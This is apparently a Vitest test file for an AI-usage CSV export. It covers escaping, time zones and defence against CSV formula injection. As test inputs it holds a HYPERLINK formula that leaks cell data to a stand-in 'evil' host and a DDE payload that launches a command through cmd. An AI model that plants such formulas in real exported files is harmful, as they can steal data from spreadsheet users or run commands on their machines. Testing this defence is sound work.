// @vitest-environment node
import { describe, expect, it } from "vitest";

import { aiUsageCsv, csvField, isoInZone, AI_USAGE_CSV_HEADER } from "@/lib/ai-usage/csv";
import type { AiUsageCall } from "@/lib/db/queries/ai-usage";

const base: AiUsageCall = {
  id: 1, at: new Date("2026-10-07T12:03:12Z"), provider: "codex-cli", model: "gpt-6.1-sol", modelSource: "cli_default", task: "score", outcome: "ok", errorKind: null,
  tokensIn: 3000, tokensInCached: 1000, tokensInCacheWrite: 0, tokensOut: 200, tokensOutReasoning: 50, durationMs: 8000, costUsd: 0, equivalentUsd: 0.0061,
  job: { id: 5, title: "Engineer, \"Forward\"\nDeployed", company: "X" },
};

describe("csv export", () => {
  it("starts with a BOM and the English header, CRLF lines", () => {
    const text = aiUsageCsv([], "Europe/Berlin");
    expect(text.startsWith("﻿" + AI_USAGE_CSV_HEADER.join(","))).toBe(true);
    expect(text.endsWith("\r\n")).toBe(true);
  });
  it("writes unknown values as empty cells and escapes quotes, commas and line breaks", () => {
    const text = aiUsageCsv([base, { ...base, id: 2, model: null, tokensIn: null, tokensOut: null, equivalentUsd: null, job: null }], "Europe/Berlin");
    const [, first, second] = text.slice(1).split("\r\n");
    expect(first).toContain(',5,"Engineer, ""Forward""\nDeployed"');
    expect(second).toContain("codex-cli,,cli_default,ok,,,1000,0,,50,8000,,0,,");
    expect(second?.endsWith(",0,,")).toBe(true);
  });
  it("field escaping", () => {
    expect(csvField(null)).toBe("");
    expect(csvField("a,b")).toBe('"a,b"');
    expect(csvField(1.5)).toBe("1.5");
  });
  it("neutralises spreadsheet formulas in text cells (CSV injection) but leaves numbers alone", () => {
    expect(csvField('=HYPERLINK("https://evil/?"&A1,"click")')).toBe('"\'=HYPERLINK(""https://evil/?""&A1,""click"")"');
    for (const start of ["=1+1", "+1", "-1", "@SUM(A1)", "\tTab", "\rCR"]) expect(csvField(start).replace(/^"/, "").startsWith("'")).toBe(true);
    expect(csvField("Engineer = fun")).toBe("Engineer = fun");
    expect(csvField(-1)).toBe("-1");
    expect(csvField(-0.5)).toBe("-0.5");
  });
  it("applies it to the job title column", () => {
    const text = aiUsageCsv([{ ...base, job: { id: 5, title: "=cmd|' /C calc'!A0", company: "X" } }], "Europe/Berlin");
    expect(text).toContain(",5,'=cmd|' /C calc'!A0");
  });
  it("renders the time with the zone's offset", () => {
    expect(isoInZone(new Date("2026-10-07T12:03:12Z"), "Europe/Berlin")).toBe("2026-10-07T14:03:12+02:00");
    expect(isoInZone(new Date("2026-01-07T12:03:12Z"), "Europe/Berlin")).toBe("2026-01-07T13:03:12+01:00");
    expect(isoInZone(new Date("2026-10-07T12:03:12Z"), "UTC")).toBe("2026-10-07T12:03:12+00:00");
  });
});
